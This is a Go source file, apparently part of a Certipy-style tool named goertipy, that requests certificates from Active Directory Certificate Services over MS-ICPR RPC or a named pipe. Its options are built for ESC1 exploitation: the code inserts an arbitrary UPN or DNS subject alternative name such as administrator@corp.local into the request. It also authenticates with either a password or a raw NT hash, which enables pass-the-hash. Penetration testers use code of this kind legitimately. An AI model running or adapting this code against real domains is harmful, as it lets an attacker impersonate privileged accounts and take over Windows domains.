package adcs

import (
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/oiweiwei/go-msrpc/dcerpc"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/icpr/icertpassage/v0"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	goertipycert "github.com/slacker/goertipy/pkg/cert"
)

// Disposition constants from MS-WCCE
const (
	DispositionIncomplete      = 0
	DispositionDenied          = 0x00000002 // CR_DISP_DENIED
	DispositionIssued          = 0x00000003 // CR_DISP_ISSUED
	DispositionIssuedOutOfBand = 0x00000004
	DispositionUnderSubmission = 0x00000005 // CR_DISP_UNDER_SUBMISSION (pending)
)

// Request flags from MS-WCCE / MS-ICPR
const (
	CRFlagRenewal = 0x00000004
	// CR_IN_PKCS10 — CSR is a PKCS#10 request
	CRInPKCS10 = 0x00000100
)

// EnrollOptions holds configuration for certificate enrollment.
type EnrollOptions struct {
	// CA name in "host\ca-name" format
	CA string

	// Template to request
	Template string

	// Subject override
	Subject string

	// SAN overrides for ESC1 exploitation
	UPN string // UPN SAN (e.g., administrator@corp.local)
	DNS string // DNS SAN

	// Target server
	Server string

	// Auth
	Username string
	Password string
	NTHash   string
	Domain   string

	// Key options
	KeySize int

	// Output
	OutputPrefix string

	// HTTP/HTTPS enrollment URL (e.g., http://ca.corp.local)
	WebURL string

	// Use named pipe transport (ncacn_np) instead of EPM/TCP
	UsePipe bool

	// ProxyURL is a SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)
	// Used for LDAP and HTTP transports only (RPC does not support proxying)
	ProxyURL string

	// Debug output
	Debug bool
}

// RetrieveOptions holds configuration for retrieving a pending certificate.
type RetrieveOptions struct {
	CA        string
	RequestID uint32
	Server    string
	Username  string
	Password  string
	NTHash    string
	Domain    string
	WebURL    string
	UsePipe   bool
	Debug     bool
}

// EnrollResult holds the result of a certificate enrollment.
type EnrollResult struct {
	RequestID   uint32
	Disposition uint32
	Status      string
	Certificate *x509.Certificate
	PrivateKey  *rsa.PrivateKey
	CACerts     []*x509.Certificate
}

// Enroll requests a certificate from a CA via ICertPassage (MS-ICPR).
func Enroll(ctx context.Context, opts *EnrollOptions) (*EnrollResult, error) {
	// Parse CA name — extract just the CA name after backslash
	caName := opts.CA
	if idx := strings.Index(caName, "\\"); idx >= 0 {
		caName = caName[idx+1:]
	}

	// Determine subject
	subject := opts.Subject
	if subject == "" {
		subject = opts.Username
	}

	// Generate key pair and CSR
	key, err := goertipycert.GenerateKeyPair(opts.KeySize)
	if err != nil {
		return nil, fmt.Errorf("failed to generate key pair: %w", err)
	}

	csr, err := goertipycert.CreateCSR(key, subject, opts.UPN, opts.DNS)
	if err != nil {
		return nil, fmt.Errorf("failed to create CSR: %w", err)
	}

	// Build request attributes as UTF-16LE CERTTRANSBLOB
	attrs := fmt.Sprintf("CertificateTemplate:%s", opts.Template)
	if opts.UPN != "" {
		attrs += fmt.Sprintf("\nSAN:upn=%s", opts.UPN)
	}
	if opts.DNS != "" {
		attrs += fmt.Sprintf("\nSAN:dns=%s", opts.DNS)
	}

	// Connect via ICertPassage (direct RPC, same as Certipy)
	var client icertpassage.CertPassageClient
	var cleanup func()
	if opts.UsePipe {
		client, cleanup, err = connectRPCPipe(ctx, opts.Server, opts.Username, opts.Password, opts.NTHash, opts.Domain, opts.Debug)
	} else {
		client, cleanup, err = connectRPC(ctx, opts.Server, opts.Username, opts.Password, opts.NTHash, opts.Domain, opts.Debug)
	}
	if err != nil {
		return nil, fmt.Errorf("RPC connection failed: %w", err)
	}
	defer cleanup()

	resp, err := client.CertServerRequest(ctx, &icertpassage.CertServerRequestRequest{
		Authority: caName,
		Flags:     CRInPKCS10,
		Attributes: &wcce.CertTransportBlob{
			Buffer: encodeUTF16LE(attrs),
		},
		Request: &wcce.CertTransportBlob{
			Buffer: csr,
		},
	})
	if err != nil {
		return nil, fmt.Errorf("CertServerRequest RPC failed: %w", err)
	}

	result := &EnrollResult{
		RequestID:   resp.RequestID,
		Disposition: resp.Disposition,
		PrivateKey:  key,
	}

	// Check disposition
	switch resp.Disposition {
	case 3: // CR_DISP_ISSUED
		result.Status = "Certificate issued"
		// Parse the certificate from the response
		if resp.EncodedCert != nil && len(resp.EncodedCert.Buffer) > 0 {
			cert, err := x509.ParseCertificate(resp.EncodedCert.Buffer)
			if err != nil {
				return result, fmt.Errorf("certificate issued but failed to parse: %w", err)
			}
			result.Certificate = cert
		}

	case 5: // CR_DISP_UNDER_SUBMISSION (pending)
		result.Status = fmt.Sprintf("Certificate request pending (ID: %d) — requires manager approval", resp.RequestID)

	default:
		msg := ""
		if resp.DispositionMessage != nil && len(resp.DispositionMessage.Buffer) > 0 {
			// Disposition message is UTF-16LE encoded
			msg = decodeUTF16(resp.DispositionMessage.Buffer)
		}
		if msg != "" {
			result.Status = fmt.Sprintf("Request denied (disposition: %d): %s", resp.Disposition, msg)
		} else {
			result.Status = fmt.Sprintf("Request denied (disposition: %d)", resp.Disposition)
		}
		return result, fmt.Errorf("certificate request denied: %s", result.Status)
	}

	return result, nil
}

// Retrieve fetches a pending certificate by request ID.
func Retrieve(ctx context.Context, opts *RetrieveOptions) (*EnrollResult, error) {
	caName := opts.CA
	if idx := strings.Index(caName, "\\"); idx >= 0 {
		caName = caName[idx+1:]
	}

	var client icertpassage.CertPassageClient
	var cleanup func()
	var err error
	if opts.UsePipe {
		client, cleanup, err = connectRPCPipe(ctx, opts.Server, opts.Username, opts.Password, opts.NTHash, opts.Domain, opts.Debug)
	} else {
		client, cleanup, err = connectRPC(ctx, opts.Server, opts.Username, opts.Password, opts.NTHash, opts.Domain, opts.Debug)
	}
	if err != nil {
		return nil, fmt.Errorf("RPC connection failed: %w", err)
	}
	defer cleanup()

	resp, err := client.CertServerRequest(ctx, &icertpassage.CertServerRequestRequest{
		Authority:  caName,
		Flags:      0,
		RequestID:  opts.RequestID,
		Attributes: &wcce.CertTransportBlob{},
		Request:    &wcce.CertTransportBlob{},
	})
	if err != nil {
		return nil, fmt.Errorf("CertServerRequest (retrieve) RPC failed: %w", err)
	}

	result := &EnrollResult{
		RequestID:   resp.RequestID,
		Disposition: resp.Disposition,
	}

	if resp.Disposition == 3 && resp.EncodedCert != nil && len(resp.EncodedCert.Buffer) > 0 {
		cert, err := x509.ParseCertificate(resp.EncodedCert.Buffer)
		if err != nil {
			return result, fmt.Errorf("failed to parse retrieved certificate: %w", err)
		}
		result.Certificate = cert
		result.Status = "Certificate retrieved"
	} else if resp.Disposition == 5 {
		result.Status = "Certificate still pending"
	} else {
		result.Status = fmt.Sprintf("Unexpected disposition: %d", resp.Disposition)
	}

	return result, nil
}

// connectRPC establishes a direct RPC connection to the CA's ICertPassage
// interface (MS-ICPR). This matches Certipy's approach: resolve the endpoint
// dynamically via EPM on port 135, then connect directly via TCP.
// No DCOM activation is needed — avoids RemoteActivation permission issues.
func connectRPC(ctx context.Context, server, username, password, ntHash, domain string, debug bool) (icertpassage.CertPassageClient, func(), error) {
	// Register credentials globally with domain for NTLM.
	if password != "" {
		gssapi.AddCredential(credential.NewFromPassword(username, password,
			credential.Domain(strings.ToUpper(domain))))
	} else if ntHash != "" {
		hashBytes, err := hex.DecodeString(ntHash)
		if err != nil {
			return nil, nil, fmt.Errorf("invalid NT hash hex: %w", err)
		}
		gssapi.AddCredential(credential.NewFromNTHashBytes(username, hashBytes,
			credential.Domain(strings.ToUpper(domain))))
	} else {
		return nil, nil, fmt.Errorf("either password or NT hash is required")
	}
	gssapi.AddMechanism(ssp.NTLM)

	ctx = gssapi.NewSecurityContext(ctx)

	// Dial the CA's ICertPassage endpoint via EPM (endpoint mapper).
	// This resolves the dynamic TCP port for ICertPassage on the CA server,
	// similar to Certipy's approach of resolving 91AE6020-9E3C-11CF-8D7C-00AA00C091BE.
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] Resolving ICertPassage endpoint via EPM on %s\n", server)
	}

	cc, err := dcerpc.Dial(ctx, server,
		epm.EndpointMapper(ctx, server, dcerpc.WithSeal(), dcerpc.WithTargetName(server)),
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(server))
	if err != nil {
		return nil, nil, fmt.Errorf("failed to connect to %s: %w", server, err)
	}
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] Connected to %s\n", server)
	}

	// Create ICertPassage client on the resolved connection
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] Creating ICertPassage client\n")
	}
	client, err := icertpassage.NewCertPassageClient(ctx, cc,
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(server))
	if err != nil {
		cc.Close(ctx)
		return nil, nil, fmt.Errorf("failed to create ICertPassage client: %w", err)
	}
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] ICertPassage client created successfully\n")
	}

	cleanup := func() {
		cc.Close(context.Background())
	}

	return client, cleanup, nil
}

// connectRPCPipe connects to the ICertPassage endpoint via SMB named pipe
// (ncacn_np:\\server\pipe\cert). This uses port 445 and doesn't need EPM.
func connectRPCPipe(ctx context.Context, server, username, password, ntHash, domain string, debug bool) (icertpassage.CertPassageClient, func(), error) {
	// Register credentials (shared setup with connectRPC)
	if password != "" {
		gssapi.AddCredential(credential.NewFromPassword(username, password,
			credential.Domain(strings.ToUpper(domain))))
	} else if ntHash != "" {
		hashBytes, err := hex.DecodeString(ntHash)
		if err != nil {
			return nil, nil, fmt.Errorf("invalid NT hash hex: %w", err)
		}
		gssapi.AddCredential(credential.NewFromNTHashBytes(username, hashBytes,
			credential.Domain(strings.ToUpper(domain))))
	} else {
		return nil, nil, fmt.Errorf("either password or NT hash is required")
	}
	gssapi.AddMechanism(ssp.NTLM)

	ctx = gssapi.NewSecurityContext(ctx)

	// Connect via SMB named pipe — well-known endpoint for ICertPassage
	pipeAddr := fmt.Sprintf("ncacn_np:%s[\\pipe\\cert]", server)
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] Connecting via named pipe: %s\n", pipeAddr)
	}

	cc, err := dcerpc.Dial(ctx, pipeAddr,
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(server))
	if err != nil {
		return nil, nil, fmt.Errorf("failed to connect to %s via named pipe: %w", server, err)
	}
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] Connected via named pipe\n")
	}

	client, err := icertpassage.NewCertPassageClient(ctx, cc,
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(server))
	if err != nil {
		cc.Close(ctx)
		return nil, nil, fmt.Errorf("failed to create ICertPassage client: %w", err)
	}
	if debug {
		fmt.Fprintf(os.Stderr, "[DEBUG] ICertPassage client created via named pipe\n")
	}

	cleanup := func() {
		cc.Close(context.Background())
	}

	return client, cleanup, nil
}

// encodeUTF16LE encodes a Go string to UTF-16LE bytes (with null terminator).
func encodeUTF16LE(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, (len(runes)+1)*2)
	for i, r := range runes {
		buf[2*i] = byte(r)
		buf[2*i+1] = byte(r >> 8)
	}
	// null terminator already zero from make
	return buf
}

// decodeUTF16 decodes a UTF-16LE byte slice to a Go string.
func decodeUTF16(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = uint16(b[2*i]) | uint16(b[2*i+1])<<8
	}
	// Trim null terminator
	for len(u16) > 0 && u16[len(u16)-1] == 0 {
		u16 = u16[:len(u16)-1]
	}
	return string([]rune(convertUTF16(u16)))
}

func convertUTF16(u16 []uint16) string {
	runes := make([]rune, len(u16))
	for i, v := range u16 {
		runes[i] = rune(v)
	}
	return string(runes)
}
